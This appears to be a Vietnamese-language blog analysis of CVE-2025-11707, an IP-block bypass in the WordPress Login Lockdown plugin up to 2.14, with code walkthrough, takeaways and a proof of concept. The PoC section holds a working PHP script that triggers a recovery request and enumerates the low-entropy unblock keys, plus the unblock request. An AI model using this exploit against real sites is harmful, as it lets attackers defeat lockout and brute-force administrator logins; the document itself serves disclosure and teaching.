# CVE-2025-11707 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin Login Lockdown & Protection cho WordPress b·ªã t·ªìn t·∫°i l·ªó h·ªïng cho ph√©p **v∆∞·ª£t qua c∆° ch·∫ø ch·∫∑n IP** trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn **2.14 (bao g·ªìm c·∫£ 2.14)**. Nguy√™n nh√¢n l√† do kh√≥a `$unblock_key` kh√¥ng ƒë·ªß ng·∫´u nhi√™n, khi·∫øn nh·ªØng ng∆∞·ªùi d√πng **ch∆∞a x√°c th·ª±c** nh∆∞ng c√≥ quy·ªÅn truy c·∫≠p v√†o email c·ªßa t√†i kho·∫£n qu·∫£n tr·ªã c√≥ th·ªÉ **t·∫°o ra kh√≥a m·ªü ch·∫∑n h·ª£p l·ªá cho ƒë·ªãa ch·ªâ IP c·ªßa h·ªç**. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c **v∆∞·ª£t qua vi·ªác b·ªã ch·∫∑n do ƒëƒÉng nh·∫≠p sai nhi·ªÅu l·∫ßn**.

* **CVE ID**: [CVE-2025-11707](https://www.cve.org/CVERecord?id=CVE-2025-11707)
* **Vulnerability Type**: Bypass Vulnerability
* **Affected Versions**: <= 2.14
* **Patched Versions**: 2.15
* **CVSS severity**: Low (5.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Login Lockdown Plugin](https://wordpress.org/plugins/login-lockdown/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Login Lockdown**:  
    * `2.14` ‚Äì **vulnerable**  
    * `2.15` ‚Äì **patched**
* **Diff Tool (diff)** ‚Üí [**Meld**](https://meldmerge.org/) ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.

## Analysis 
> [!NOTE]
> Theo m√¥ t·∫£ c·ªßa CVE, l·ªó h·ªïng cho ph√©p k·∫ª t·∫•n c√¥ng v∆∞·ª£t qua c∆° ch·∫ø ch·∫∑n IP sau nhi·ªÅu l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i.
> Tr∆∞·ªõc khi ph√¢n t√≠ch k·ªπ thu·∫≠t bypass, c·∫ßn hi·ªÉu r√µ **c√°ch plugin th·ª±c hi·ªán c∆° ch·∫ø block**.

### Increment Fails
Plugin ƒëƒÉng k√Ω action hook cho s·ª± ki·ªán ƒëƒÉng nh·∫≠p th·∫•t b·∫°i:

```php {title="loginlockdown.php v2.14" hl_lines=[] data-open=true}
add_action('wp_login_failed', array('LoginLockdown_Functions', 'loginFailed'), 10, 2);
```

Khi ƒëƒÉng nh·∫≠p th·∫•t b·∫°i, WordPress s·∫Ω g·ªçi h√†m `loginFailed()`:

```php {title="functions.php v2.14" hl_lines=[] data-open=true}
static function loginFailed($username, $error)
{
    self::incrementFails($username, $error->get_error_code());
}
```

H√†m n√†y ti·∫øp t·ª•c g·ªçi `incrementFails()` ƒë·ªÉ l∆∞u l·∫°i l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i c√πng m√£ l·ªói:

```php {title="functions.php v2.14" hl_lines=[] data-open=true}
static function incrementFails($username = "", $reason = "")
{
    global $wpdb;
    $options = LoginLockdown_Setup::get_options();
    $ip = LoginLockdown_Utility::getUserIP();

    $username = sanitize_user($username);
    $user = get_user_by('login', $username);

    if ($user || 1 == $options['lockout_invalid_usernames']) {
      if ($user === false) {
        $user_id = -1;
      } else {
        $user_id = $user->ID;
      }

      //phpcs:ignore no need to cache
      $wpdb->insert( //phpcs:ignore
        $wpdb->lockdown_login_fails,
        array(
          'user_id' => $user_id,
          'login_attempt_date' => current_time('mysql'),
          'login_attempt_IP' => $ip,
          'failed_user' => $username,
          'reason' => $reason
        )
      );
    }
}
```

Trong c∆° s·ªü d·ªØ li·ªáu, c√°c b·∫£n ghi ƒë∆∞·ª£c l∆∞u nh∆∞ sau:

```sh
mysql> select * from wp_login_fails;
+------------------+---------+---------------------+------------------+-------------+------------------+
| login_attempt_ID | user_id | login_attempt_date  | login_attempt_IP | failed_user | reason           |
+------------------+---------+---------------------+------------------+-------------+------------------+
|                5 |      -1 | 2026-01-22 03:07:05 | 172.18.0.1       | a           | invalid_username |
|                6 |      -1 | 2026-01-22 03:24:09 | 172.18.0.1       | a           | invalid_username |
+------------------+---------+---------------------+------------------+-------------+------------------+
```

Nh∆∞ v·∫≠y, m·ªói l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i s·∫Ω ƒë∆∞·ª£c ghi l·∫°i k√®m theo IP, username v√† l√Ω do l·ªói.

### Authentication & Block
Plugin can thi·ªáp tr·ª±c ti·∫øp v√†o qu√° tr√¨nh x√°c th·ª±c b·∫±ng c√°ch ƒëƒÉng k√Ω filter `authenticate`:

```php {title="loginlockdown.php v2.14" hl_lines=[] data-open=true}
add_filter('authenticate', array('LoginLockdown_Functions', 'wp_authenticate_username_password'), 20, 3);
```

H√†m `wp_authenticate_username_password()` ƒë∆∞·ª£c th·ª±c thi trong qu√° tr√¨nh ƒëƒÉng nh·∫≠p v√† c√≥ vai tr√≤ ki·ªÉm so√°t vi·ªác cho ph√©p hay ch·∫∑n x√°c th·ª±c.

```php {title="functions.php v2.14" hl_lines=[] data-open=true}
static function wp_authenticate_username_password($user, $username, $password)
{
    if (is_a($user, 'WP_User')) {
      return $user;
    }

    $options = LoginLockdown_Setup::get_options();

    $whitelisted = false;
    $user_ip = LoginLockdown_Utility::getUserIP();
    if (in_array($user_ip, $options['whitelist'])) {
      $whitelisted = true;
    }

    if (!$whitelisted && self::isLockedDown()) {
      self::lockdown_screen($options['block_message']);
      return new WP_Error('lockdown_fail_count', __("<strong>ERROR</strong>: We're sorry, but this IP has been blocked due to too many recent failed login attempts.<br /><br />Please try again later.", 'login-lockdown'));
    }

    if (!$username) {
      return $user;
    }

    if (self::is_rest_request()) {
      return $user;
    }

    $captcha = self::handle_captcha();
    if (is_wp_error($captcha)) {
      if ($options['max_login_retries'] <= self::countFails($username) && self::countFails($username) > 0) {
        self::lockDown($username, 'Too many captcha fails');
      }
      return $captcha;
    }

    $userdata = get_user_by('login', $username);

    if (!$whitelisted && $options['max_login_retries'] <= self::countFails($username)) {
      if ($options['max_login_retries'] <= self::countFails($username) && self::countFails($username) > 0) {
        self::lockDown($username, 'Too many fails');
      }

      return new WP_Error('lockdown_fail_count', __("<strong>ERROR</strong>: We're sorry, but this IP has been blocked due to too many recent failed login attempts.<br /><br />Please try again later.", 'login-lockdown'));
    }

    if (empty($username) || empty($password)) {
      $error = new WP_Error();

      if (empty($username))
        $error->add('empty_username', __('<strong>ERROR</strong>: The username field is empty.', 'login-lockdown'));

      if (empty($password))
        $error->add('empty_password', __('<strong>ERROR</strong>: The password field is empty.', 'login-lockdown'));

      return $error;
    }

    if ($userdata === false) {
      /* translators: %s is the url of the WordPress lost password page. */
      return new WP_Error('invalid_username', sprintf(__('<strong>ERROR</strong>: Invalid username. <a href="%s" title="Password Lost and Found">Lost your password</a>?', 'login-lockdown'), site_url('wp-login.php?action=lostpassword', 'login')));
    }

    $userdata = apply_filters('wp_authenticate_user', $userdata, $password);
    if (is_wp_error($userdata)) {
      return $userdata;
    }

    if (!is_string($password) || !is_string($userdata->user_pass) || is_null($userdata->ID) || !wp_check_password($password, $userdata->user_pass, $userdata->ID)) {
      /* translators: %s is the url of the WordPress lost password page. */
      return new WP_Error('incorrect_password', sprintf(__('<strong>ERROR</strong>: Incorrect password. <a href="%s" title="Password Lost and Found">Lost your password</a>?', 'login-lockdown'), site_url('wp-login.php?action=lostpassword', 'login')));
    }

    $user =  new WP_User($userdata->ID);
    return $user;
}
```

1. **B·ªè qua n·∫øu ng∆∞·ªùi d√πng ƒë√£ ƒë∆∞·ª£c x√°c th·ª±c**

```php
if (is_a($user, 'WP_User')) {
    return $user;
}
```

N·∫øu WordPress ƒë√£ x√°c th·ª±c th√†nh c√¥ng t·ª´ tr∆∞·ªõc, plugin kh√¥ng can thi·ªáp th√™m.

2. **Ki·ªÉm tra whitelist v√† tr·∫°ng th√°i b·ªã kh√≥a**

```php
$user_ip = LoginLockdown_Utility::getUserIP();
if (in_array($user_ip, $options['whitelist'])) {
    $whitelisted = true;
}

if (!$whitelisted && self::isLockedDown()) {
    self::lockdown_screen($options['block_message']);
    return new WP_Error('lockdown_fail_count', 'IP has been blocked');
}
```

N·∫øu IP kh√¥ng n·∫±m trong whitelist v√† ƒëang b·ªã kh√≥a, h·ªá th·ªëng s·∫Ω ch·∫∑n ƒëƒÉng nh·∫≠p ngay l·∫≠p t·ª©c.

3. **B·ªè qua trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát**

```php
if (!$username) return $user;
if (self::is_rest_request()) return $user;
```

N·∫øu kh√¥ng c√≥ username ho·∫∑c l√† REST request, plugin kh√¥ng √°p d·ª•ng ki·ªÉm so√°t ƒëƒÉng nh·∫≠p.

4. **X·ª≠ l√Ω CAPTCHA**

```php
$captcha = self::handle_captcha();
if (is_wp_error($captcha)) {
    if ($options['max_login_retries'] <= self::countFails($username)) {
        self::lockDown($username, 'Too many captcha fails');
    }
    return $captcha;
}
```

N·∫øu CAPTCHA th·∫•t b·∫°i v√† s·ªë l·∫ßn l·ªói v∆∞·ª£t ng∆∞·ª°ng, t√†i kho·∫£n/IP s·∫Ω b·ªã kh√≥a.

5. **Ki·ªÉm tra s·ªë l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i**

```php
if (!$whitelisted && $options['max_login_retries'] <= self::countFails($username)) {
    self::lockDown($username, 'Too many fails');
    return new WP_Error('lockdown_fail_count', 'IP has been blocked');
}
```

N·∫øu v∆∞·ª£t qu√° s·ªë l·∫ßn cho ph√©p, plugin s·∫Ω k√≠ch ho·∫°t c∆° ch·∫ø kh√≥a.

> [!NOTE]
> `max_login_retries` ƒë∆∞·ª£c setup trong Admin Dashboard, gi√° tr·ªã m·∫∑c ƒë·ªãnh s·∫Ω l√† `3`
> ![Max login retries](max.png "Max login retries")

=> Nh∆∞ v·∫≠y, ch·ªâ c·∫ßn **3 l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i li√™n ti·∫øp**, IP s·∫Ω b·ªã ƒë∆∞a v√†o tr·∫°ng th√°i b·ªã ch·∫∑n v√† m·ªçi l·∫ßn ƒëƒÉng nh·∫≠p ti·∫øp theo t·ª´ IP ƒë√≥ s·∫Ω b·ªã t·ª´ ch·ªëi ngay **t·ª´ ƒë·∫ßu qu√° tr√¨nh x√°c th·ª±c**.

![Blocked](blocked.png "Blocked")

### Get Unlock Key

ƒê·ªÉ k√≠ch ho·∫°t quy tr√¨nh m·ªü kh√≥a, ng∆∞·ªùi d√πng ph·∫£i g·ª≠i form recovery k√®m theo **email c·ªßa m·ªôt t√†i kho·∫£n administrator**.

```php {title="functions.php v2.14" hl_lines=[] data-open=true}
if (!isset($_POST['loginlockdown_recovery_email']) || !filter_var(wp_unslash($_POST['loginlockdown_recovery_email']), FILTER_VALIDATE_EMAIL)) {
  $display_message = '<p class="error">Invalid email address.</p>';
} else {
  $email = sanitize_text_field(wp_unslash($_POST['loginlockdown_recovery_email']));
  $user = get_user_by('email', $email);        
  if (user_can($user, 'administrator')) {
    $unblock_key = md5(time() . wp_rand(10000, 9999));
    $unblock_attempts = get_transient('loginlockdown_unlock_count_' . $user->ID);
    if (!$unblock_attempts) {
      $unblock_attempts = 0;
    }

    $unblock_attempts++;
    set_transient('loginlockdown_unlock_count_' . $user->ID, $unblock_attempts, HOUR_IN_SECONDS);

    if ($unblock_attempts <= 3) {
      set_transient('loginlockdown_unlock_' . $unblock_key, $unblock_key, HOUR_IN_SECONDS);

      $unblock_url = add_query_arg(array('loginlockdown_unblock' => $unblock_key), wp_login_url());

      $subject  = 'Login Lockdown unblock instructions for ' . site_url();
      $message  = '<p>The IP ' . LoginLockdown_Utility::getUserIP() . ' has been locked down and someone submitted an unblock request using your email address <strong>' . $email . '</strong></p>';
      $message .= '<p>If this was you, and you have locked yourself out please click <a target="_blank" href="' . $unblock_url . '">this link</a> which is valid for 1 hour.</p>';
      $message .= '<p>Please note that for security reasons, this will only unblock the IP of the person opening the link, not the IP of the person who submitted the unblock request. To unblock someone else please do so on the <a href="' . admin_url('options-general.php?page=loginlockdown#loginlockdown_activity') . '">Login Lockdown Activity Page</p>';

      add_filter('wp_mail_content_type', function () {
        return "text/html";
      });

      wp_mail($user->user_email, $subject, $message);
    }
  } else {
    // If no admin using the submitted email exists, ignore silently
  }

  if (isset($unblock_attempts) && $unblock_attempts > 3) {
    $display_message = '<p class="error">You have already attempted to unblock yourself recently, please wait 1 hour before trying again.</p>';
  } else {
    $display_message = '<p>If an administrator having the email address <strong>' . $email . '</strong> exists, an email has been sent with instructions to regain access.</p>';
  }
}
```

1. **X√°c minh email c√≥ thu·ªôc v·ªÅ administrator hay kh√¥ng**

```php
$email = sanitize_text_field(wp_unslash($_POST['loginlockdown_recovery_email']));
$user = get_user_by('email', $email);

if (user_can($user, 'administrator')) 
```

Ch·ªâ khi email thu·ªôc v·ªÅ t√†i kho·∫£n c√≥ quy·ªÅn **administrator** th√¨ h·ªá th·ªëng m·ªõi ti·∫øp t·ª•c sinh unlock key v√† g·ª≠i email.

2. **Gi·ªõi h·∫°n s·ªë l·∫ßn y√™u c·∫ßu m·ªü kh√≥a**

```php
$unblock_attempts = get_transient('loginlockdown_unlock_count_' . $user->ID);
$unblock_attempts++;
set_transient('loginlockdown_unlock_count_' . $user->ID, $unblock_attempts, HOUR_IN_SECONDS);
```

* Gi·ªõi h·∫°n: t·ªëi ƒëa **3 l·∫ßn / 1 gi·ªù / m·ªói admin**
* B·ªô ƒë·∫øm g·∫Øn v·ªõi `user_id`, kh√¥ng g·∫Øn v·ªõi **IP ƒëang b·ªã block**

=> N·∫øu t·ªìn t·∫°i nhi·ªÅu t√†i kho·∫£n admin, m·ªói t√†i kho·∫£n c√≥ quota ri√™ng, d·ªÖ b·ªã l·∫°m d·ª•ng.

3. **Sinh `unblock_key` v√† l∆∞u transient**

```php
$unblock_key = md5(time() . wp_rand(10000, 9999));
set_transient('loginlockdown_unlock_' . $unblock_key, $unblock_key, HOUR_IN_SECONDS);
```

`unblock_key` ƒë∆∞·ª£c t·∫°o t·ª´:
* `time()` => timestamp theo gi√¢y (d·ªÖ ƒëo√°n)
* `wp_rand(10000, 9999)` => ch·ªâ tr·∫£ v·ªÅ 2 gi√° tr·ªã: `9999` v√† `10000`
* Hash MD5 => kh√¥ng l√†m tƒÉng entropy

Key ch·ªâ ƒë∆∞·ª£c l∆∞u ƒë∆°n l·∫ª trong transient, kh√¥ng g·∫Øn v·ªõi IP hay user.

=> Ch·ªâ c·∫ßn ƒëo√°n ƒë√∫ng key c√≤n hi·ªáu l·ª±c trong 1 gi·ªù l√† c√≥ th·ªÉ k√≠ch ho·∫°t unblock cho IP hi·ªán t·∫°i.

4. **G·ª≠i link m·ªü kh√≥a qua email**

```php
$unblock_url = wp-login.php?loginlockdown_unblock=<key>
wp_mail($user->user_email, ...);
```

Email ch·ª©a link m·ªü kh√≥a c√≥ hi·ªáu l·ª±c trong 1 gi·ªù.
Theo thi·∫øt k·∫ø, admin ph·∫£i b·∫•m link tr√™n **IP ƒëang b·ªã kh√≥a** ƒë·ªÉ m·ªü kh√≥a IP ƒë√≥.

> [!NOTE]
> Nh∆∞ v·∫≠y, k·∫ª t·∫•n c√¥ng **kh√¥ng c·∫ßn truy c·∫≠p email c·ªßa administrator**.
> Ch·ªâ c·∫ßn **g·ª≠i y√™u c·∫ßu m·ªü kh√≥a ƒë·ªÉ k√≠ch ho·∫°t qu√° tr√¨nh sinh `unblock_key`**, ƒë·ªìng th·ªùi **t·ª± sinh c√°c gi√° tr·ªã key theo ƒë√∫ng thu·∫≠t to√°n trong code** (d·ª±a tr√™n `time()` v√† `wp_rand()`), r·ªìi th·ª≠ tr·ª±c ti·∫øp tr√™n endpoint:
>
> ```
> wp-login.php?loginlockdown_unblock=<key>
> ```
>
> Khi ƒëo√°n tr√∫ng m·ªôt `unblock_key` c√≤n hi·ªáu l·ª±c trong transient, IP hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c **m·ªü kh√≥a ngay l·∫≠p t·ª©c**, t·ª´ ƒë√≥ c√≥ th·ªÉ ti·∫øp t·ª•c th·ª±c hi·ªán c√°c l·∫ßn ƒëƒÉng nh·∫≠p th·ª≠ m·∫≠t kh·∫©u.
>
> => ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng **li√™n t·ª•c t·ª± m·ªü kh√≥a cho ch√≠nh m√¨nh**, v√¥ hi·ªáu h√≥a ho√†n to√†n c∆° ch·∫ø ch·∫∑n IP c·ªßa plugin.

### Unlock
Plugin ƒëƒÉng k√Ω hook ·ªü giai ƒëo·∫°n r·∫•t s·ªõm c·ªßa v√≤ng ƒë·ªùi request:

```php {title="loginlockdown.php v2.14" hl_lines=[] data-open=true}
add_action('init', array('loginlockdown', 'init'), -1);
```

Trong h√†m `init()`, plugin g·ªçi tr·ª±c ti·∫øp:

```php {title="loginlockdown.php v2.14" hl_lines=[] data-open=true}
LoginLockdown_Functions::handle_unblock();
```

ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† **m·ªçi request t·ªõi WordPress**, k·ªÉ c·∫£ tr∆∞·ªõc khi hi·ªÉn th·ªã trang ƒëƒÉng nh·∫≠p hay ki·ªÉm tra x√°c th·ª±c, ƒë·ªÅu s·∫Ω ch·∫°y logic m·ªü kh√≥a n·∫øu t·ªìn t·∫°i tham s·ªë:

```php
?loginlockdown_unblock=...
```

=> Ch·ªâ c·∫ßn g·ª≠i m·ªôt HTTP request b·∫•t k·ª≥ t·ªõi site k√®m tham s·ªë n√†y l√† c√≥ th·ªÉ k√≠ch ho·∫°t logic unblock.

```php {title="functions.php v2.14" hl_lines=[] data-open=true}
static function handle_unblock()
{
  global $wpdb;
  //phpcs:ignore missing nonce as this is called via a link in email or stored by user
  $options = LoginLockdown_Setup::get_options();
  if (isset($_GET['loginlockdown_unblock']) && $options['global_unblock_key'] === sanitize_text_field(wp_unslash($_GET['loginlockdown_unblock']))) { //phpcs:ignore
    $user_ip = LoginLockdown_Utility::getUserIP();
    if (!in_array($user_ip, $options['whitelist'])) {
      $options['whitelist'][] = LoginLockdown_Utility::getUserIP();
    }
    update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);
  }

  if (isset($_GET['loginlockdown_unblock']) && strlen($_GET['loginlockdown_unblock']) == 32) { //phpcs:ignore
    $unblock_key = sanitize_key(wp_unslash($_GET['loginlockdown_unblock'])); //phpcs:ignore
    $unblock_transient = get_transient('loginlockdown_unlock_' . $unblock_key);
    if ($unblock_transient == $unblock_key) {
      $user_ip = LoginLockdown_Utility::getUserIP();
      //phpcs:ignore no need to cache
      $wpdb->delete( //phpcs:ignore
        $wpdb->lockdown_lockdowns,
        array(
          'lockdown_IP' => $user_ip
        )
      );

      if (!in_array($user_ip, $options['whitelist'])) {
        $options['whitelist'][] = LoginLockdown_Utility::getUserIP();
      }

      update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);
    }
  }
}
```

H√†m n√†y h·ªó tr·ª£ hai c∆° ch·∫ø m·ªü kh√≥a IP.

1. **M·ªü kh√≥a b·∫±ng Global Unblock Key**

```php {title="functions.php v2.14" hl_lines=[] data-open=true}
if (isset($_GET['loginlockdown_unblock']) 
    && $options['global_unblock_key'] === sanitize_text_field($_GET['loginlockdown_unblock'])) {

    $user_ip = LoginLockdown_Utility::getUserIP();
    if (!in_array($user_ip, $options['whitelist'])) {
        $options['whitelist'][] = $user_ip;
    }
    update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);
}
```

N·∫øu tham s·ªë tr√πng v·ªõi **global key trong c·∫•u h√¨nh**, IP hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c:
* Th√™m v√†o whitelist
* Kh√¥ng c√≤n b·ªã block vƒ©nh vi·ªÖn

C∆° ch·∫ø n√†y ho√†n to√†n ph·ª• thu·ªôc v√†o vi·ªác gi·ªØ b√≠ m·∫≠t **global key**.

![Global key](global.png "Global key")

2. **M·ªü kh√≥a b·∫±ng Recovery Key (Transient)**

```php
if (isset($_GET['loginlockdown_unblock']) && strlen($_GET['loginlockdown_unblock']) == 32) {
    $unblock_key = sanitize_key($_GET['loginlockdown_unblock']);
    $unblock_transient = get_transient('loginlockdown_unlock_' . $unblock_key);

    if ($unblock_transient == $unblock_key) {
        $wpdb->delete($wpdb->lockdown_lockdowns, array('lockdown_IP' => $user_ip));

        if (!in_array($user_ip, $options['whitelist'])) {
            $options['whitelist'][] = $user_ip;
        }
        update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);
    }
}
```

ƒê√¢y l√† c∆° ch·∫ø m·ªü kh√≥a d·ª±a tr√™n **recovery key ƒë∆∞·ª£c l∆∞u trong transient**.
Plugin ch·ªâ ki·ªÉm tra hai ƒëi·ªÅu ki·ªán:

1. Tham s·ªë `loginlockdown_unblock` c√≥ ƒë·ªô d√†i ƒë√∫ng **32 k√Ω t·ª±** (d·∫°ng MD5)
2. T·ªìn t·∫°i transient `loginlockdown_unlock_<key>` v·ªõi gi√° tr·ªã tr√πng kh·ªõp

N·∫øu th·ªèa m√£n, IP hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c:

* X√≥a kh·ªèi b·∫£ng `lockdown_lockdowns`
* Th√™m v√†o whitelist

=> IP ƒë∆∞·ª£c m·ªü kh√≥a ngay l·∫≠p t·ª©c v√† kh√¥ng c√≤n b·ªã ch·∫∑n trong c√°c l·∫ßn ƒëƒÉng nh·∫≠p ti·∫øp theo.

Key n√†y ƒë√£ ƒë∆∞·ª£c ta ph√¢n t√≠ch ·ªü ph·∫ßn tr∆∞·ªõc ƒë√≥.

## Flow
```mermaid
flowchart TD
A["Attacker (Unauthenticated)"] 
--> B["Trigger multiple failed logins"]

B --> C["IP reaches max_login_retries"]

C --> D["IP is blocked (lockdown_lockdowns)"]

D --> E["Send recovery POST with admin email"]

E --> F["Plugin generates unblock_key = md5(time + wp_rand)"]

F --> G["Store transient loginlockdown_unlock_key (1 hour)"]

G --> H["Attacker brute-forces keys in ¬±1s window"]

H --> I["Send GET /?loginlockdown_unblock=guessed_key"]

I --> J{"Transient exists & matches?"}

J -->|Yes| K["Delete IP from lockdown_lockdowns"]

K --> L["Add IP to whitelist"]

L --> M["IP fully unblocked"]
```

## Proof of Concept (PoC)

1. T·∫°o file `gen_key.php` ƒë·ªÉ ƒëo√°n unlock key sau khi b·ªã block

```php
<?php

$url = "http://localhost/wp-login.php";

$data = http_build_query([
    "loginlockdown_recovery_email"  => "admin_email",
    "loginlockdown_recovery_submit" => "Send unblock email",
    "loginlockdown_recovery_nonce"  => "valid_nonce",
    "_wp_http_referer"               => "/wp-login.php",
]);

$opts = [
    "http" => [
        "method"  => "POST",
        "header"  =>
            "Content-Type: application/x-www-form-urlencoded\r\n" .
            "Referer: http://localhost/wp-login.php\r\n" .
            "User-Agent: PHP\r\n" .
            "Cookie: wordpress_test_cookie=WP%20Cookie%20check\r\n",
        "content" => $data,
        "ignore_errors" => true
    ]
];

$context = stream_context_create($opts);
$response = file_get_contents($url, false, $context);

echo $response;

$now = time();

for ($t = $now - 1; $t <= $now + 1; $t++) {
    for ($r = 9999; $r <= 10000; $r++) {
        echo md5($t . $r) . PHP_EOL;
    }
}
```

> [!NOTE]
> Do `unblock_key` ƒë∆∞·ª£c sinh d·ª±a tr√™n `time()` (ƒë·ªô ch√≠nh x√°c theo **gi√¢y**), k·∫ª t·∫•n c√¥ng ch·ªâ c·∫ßn t·∫°o c√°c gi√° tr·ªã key trong kho·∫£ng **¬±1 gi√¢y** so v·ªõi th·ªùi ƒëi·ªÉm g·ª≠i request recovery.
> V·ªõi m·ªói timestamp ch·ªâ c√≥ r·∫•t √≠t gi√° tr·ªã ng·∫´u nhi√™n kh·∫£ dƒ©, t·ªïng kh√¥ng gian t√¨m ki·∫øm l√† **r·∫•t nh·ªè**, cho ph√©p th·ª≠ to√†n b·ªô c√°c key h·ª£p l·ªá trong th·ªùi gian ng·∫Øn khi transient v·∫´n c√≤n hi·ªáu l·ª±c.

2. Ch·∫°y file `gen_key.php` ƒë·ªÉ l·∫•y key:

```php
‚îå‚îÄ‚îÄ(w41üéÉw41)-[~/Pentest/tmp]
‚îî‚îÄ$ gen_key.php 
... 
98b65fa71ca7a0f5aeefc93082c6a381
72a72562252bcd5c005bfbce95d72bea
f98100c86d0bd348eeb18332ac85756b
63894ea709e4be84967328ad37392043
f67370456015246850e783fbb406a176
bf31356071a060b3d9d12d9dc3711b30
```

**Key ƒë∆∞·ª£c l∆∞u trong database**:

```sh
mysql> SELECT option_name, option_value  FROM wp_options  WHERE option_name LIKE '%loginlockdown_unlock_%';
+--------------------------------------------------------------------------+----------------------------------+
| option_name                                                              | option_value                     |
+--------------------------------------------------------------------------+----------------------------------+
| _transient_timeout_loginlockdown_unlock_count_1                          | 1769100607                       |
| _transient_loginlockdown_unlock_count_1                                  | 1                                |
| _transient_timeout_loginlockdown_unlock_f98100c86d0bd348eeb18332ac85756b | 1769100607                       |
| _transient_loginlockdown_unlock_f98100c86d0bd348eeb18332ac85756b         | f98100c86d0bd348eeb18332ac85756b |
+--------------------------------------------------------------------------+----------------------------------+
```

=> Tr√πng v·ªõi key ta ƒë√£ t·∫°o ·ªü tr√™n

3. G·ª≠i request unlock

```http
GET /?loginlockdown_unblock=f98100c86d0bd348eeb18332ac85756b HTTP/1.1
Host: localhost
```

![Result](result.png "Result")

## Conclusion

L·ªó h·ªïng trong plugin **Login Lockdown & Protection ‚â§ 2.14** xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øt k·∫ø c∆° ch·∫ø recovery kh√¥ng an to√†n. M·∫∑c d√π quy tr√¨nh m·ªü kh√≥a ƒë∆∞·ª£c x√¢y d·ª±ng v·ªõi m·ª•c ƒë√≠ch y√™u c·∫ßu administrator x√°c nh·∫≠n qua email, nh∆∞ng tr√™n th·ª±c t·∫ø, **vi·ªác sinh v√† ki·ªÉm tra `unblock_key` kh√¥ng r√†ng bu·ªôc v·ªõi ng∆∞·ªùi d√πng, IP hay session**, ƒë·ªìng th·ªùi s·ª≠ d·ª•ng ngu·ªìn entropy r·∫•t th·∫•p. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ **t·ª± t·∫°o v√† th·ª≠ c√°c kh√≥a h·ª£p l·ªá trong th·ªùi gian ng·∫Øn**, t·ª´ ƒë√≥ m·ªü kh√≥a IP c·ªßa ch√≠nh m√¨nh m√† kh√¥ng c·∫ßn truy c·∫≠p v√†o email c·ªßa qu·∫£n tr·ªã vi√™n. K·∫øt qu·∫£ l√† to√†n b·ªô c∆° ch·∫ø ch·∫∑n IP sau nhi·ªÅu l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i c√≥ th·ªÉ b·ªã v√¥ hi·ªáu h√≥a.

## Key Takeaways

* C∆° ch·∫ø b·∫£o m·∫≠t d·ª±a tr√™n **email confirmation** s·∫Ω kh√¥ng c√≤n √Ω nghƒ©a n·∫øu **token c√≥ th·ªÉ b·ªã ƒëo√°n ƒë∆∞·ª£c**.
* Token d√πng cho c√°c h√†nh ƒë·ªông nh·∫°y c·∫£m ph·∫£i c√≥ **entropy cao**, kh√¥ng ƒë∆∞·ª£c d·ª±a v√†o `time()` ho·∫∑c ngu·ªìn ng·∫´u nhi√™n c√≥ kh√¥ng gian t√¨m ki·∫øm nh·ªè.
* Recovery token c·∫ßn ƒë∆∞·ª£c **r√†ng bu·ªôc v·ªõi ng·ªØ c·∫£nh** (IP, user, session, ho·∫∑c request) thay v√¨ ch·ªâ t·ªìn t·∫°i ƒë·ªôc l·∫≠p trong h·ªá th·ªëng.
* Logic x·ª≠ l√Ω m·ªü kh√≥a ƒë∆∞·ª£c g·∫Øn v√†o hook `init` khi·∫øn endpoint m·ªü kh√≥a c√≥ th·ªÉ b·ªã k√≠ch ho·∫°t t·ª´ **b·∫•t k·ª≥ request n√†o**, l√†m tƒÉng b·ªÅ m·∫∑t t·∫•n c√¥ng.
* C√°c c∆° ch·∫ø gi·ªõi h·∫°n (rate-limit) n·∫øu ch·ªâ g·∫Øn v·ªõi **user ID** m√† kh√¥ng g·∫Øn v·ªõi IP ho·∫∑c request source c√≥ th·ªÉ b·ªã l·∫°m d·ª•ng trong k·ªãch b·∫£n t·∫•n c√¥ng ch∆∞a x√°c th·ª±c.

## References
[Bypass Vulnerability](https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/)

[WordPress Login Lockdown Plugin <= 2.14 is vulnerable to Bypass Vulnerability](https://patchstack.com/database/wordpress/plugin/login-lockdown/vulnerability/wordpress-login-lockdown-protection-plugin-2-14-ip-block-bypass-vulnerability) 

---

> T√°c gi·∫£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/  

